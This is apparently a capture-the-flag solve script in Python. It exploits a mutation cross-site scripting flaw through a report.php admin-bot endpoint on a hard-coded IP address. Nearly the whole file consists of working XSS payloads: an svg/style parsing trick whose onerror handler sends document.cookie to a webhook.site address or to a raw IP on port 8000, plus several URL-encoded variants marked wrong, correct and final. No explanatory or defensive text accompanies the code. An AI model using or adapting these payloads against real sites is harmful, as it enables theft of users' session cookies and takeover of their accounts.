import requests 
import urllib
# https://aszx87410.github.io/beyond-xss/en/ch2/mutation-xss/
# http://127.0.0.1@3.35.54.68:8000
HOST = "http://20.115.83.90:1337"

r = requests.get(f"{HOST}/report.php", params={"url": "http://127.0.0.1/" + urllib.parse.quote('?xss=<svg><style></style><a%20id="</style><img%20src=x%20onerror=%27javascript:location.href=`https://webhook.site/ff82dc39-2a77-4719-a8d2-7689bb425af9/?t=`%2Bdocument.cookie%27>">')})

print(r.text)

# http://20.115.83.90:1337/?xss=<svg><style></style><a id="</style><img src=x onerror='javascript:location.href=`https://webhook.site/ff82dc39-2a77-4719-a8d2-7689bb425af9/?t=`%2Bdocument.cookie'>">

# TEST (wrong)
# http://20.115.83.90:1337/report.php?url=http://127.0.0.1%2F%3Fxss%3D%3Csvg%3E%3Cstyle%3E%3C%2Fstyle%3E%3Ca%20id%3D%22%3C%2Fstyle%3E%3Cimg%20src%3Dx%20onerror%3D%27javascript%3Alocation.href%3D%60https%3A%2F%2Fwebhook.site%2Fff82dc39-2a77-4719-a8d2-7689bb425af9%2F%3Ft%3D%60%252Bdocument.cookie%27%3E%22%3E

# Real (view correct)
# http://20.115.83.90:1337/report.php?url=http://127.0.0.1:1337/?xss=%3Csvg%3E%3Cstyle%3E%3C%2Fstyle%3E%3Ca%2520id=%22%3C%2Fstyle%3E%3Cimg%2520src=x%2520onerror=%27javascript%3Alocation.href=%60https%3A%2F%2Fwebhook.site%2Fff82dc39-2a77-4719-a8d2-7689bb425af9%2F%3Ft%3D%60%252Bdocument.cookie%27%3E%22%3E
# http://20.115.83.90:1337/report.php?url=http://20.115.83.90:1337/?xss=%3Csvg%3E%3Cstyle%3E%3C%2Fstyle%3E%3Ca%2520id=%22%3C%2Fstyle%3E%3Cimg%2520src=x%2520onerror=%27javascript%3Alocation.href=%60https%3A%2F%2Fwebhook.site%2Fff82dc39-2a77-4719-a8d2-7689bb425af9%2F%3Ft%3D%60%252Bdocument.cookie%27%3E%22%3E
# http://20.115.83.90:1337/report.php?url=http://127.0.0.1:1337/?xss=%3Csvg%3E%3Cstyle%3E%3C%2Fstyle%3E%3Ca%2520id=%22%3C%2Fstyle%3E%3Cimg%2520src=x%2520onerror=%27javascript%3Alocation.href=%60http://52.78.110.156:8000%2F%3Ft%3D%60%252Bdocument.cookie%27%3E%22%3E

# http://127.0.0.1:1337/?xss=<svg><style></style><a%20id="</style><img%20src=x%20onerror=javascript:fetch('http://52.78.110.156:8000')>">


# <svg><style><p%20name="</style><img%20src=1%20onerror=javascript:location.href=`https://webhook.site/ff82dc39-2a77-4719-a8d2-7689bb425af9/?t=`%2Bdocument.cookie>">






# http://20.115.83.90:1337/report.php?url=http%3A%2F%2F127.0.0.1@20.115.83.90%3A1337%2F%3Fxss%3D%253Csvg%253E%253Cstyle%253E%253C%252Fstyle%253E%253Ca%2520id%3D%2522%253C%252Fstyle%253E%253Cimg%2520src%3Dx%2520onerror%3D%2527javascript%3Alocation.href%3D%60https%3A%2F%2Fwebhook.site%2Fff82dc39-2a77-4719-a8d2-7689bb425af9%2F%3Ft%3D%60%252Bdocument.cookie%2527%253E%2522%253E

# http://localhost:7777/report.php?url=http%3A%2F%2F127.0.0.1%3A7777%2F%3Fxss%3D%253Csvg%253E%253Cstyle%253E%253C%252Fstyle%253E%253Ca%2520id%3D%2522%253C%252Fstyle%253E%253Cimg%2520src%3Dx%2520onerror%3D%2527javascript%3Alocation.href%3D%60https%3A%2F%2Fwebhook.site%2Fff82dc39-2a77-4719-a8d2-7689bb425af9%2F%3Ft%3D%60%252Bdocument.cookie%2527%253E%2522%253E

# Final 
# http://20.115.83.90:1337/report.php?url=http%3A%2F%2F127.0.0.1%3A1337%2F%3Fxss%3D%253Csvg%253E%253Cstyle%253E%253C%252Fstyle%253E%253Ca%2520id%3D%2522%253C%252Fstyle%253E%253Cimg%2520src%3Dx%2520onerror%3D%2527javascript%3Alocation.href%3D%60https%3A%2F%2Fwebhook.site%2Fff82dc39-2a77-4719-a8d2-7689bb425af9%2F%3Ft%3D%60%252Bdocument.cookie%2527%253E%2522%253E
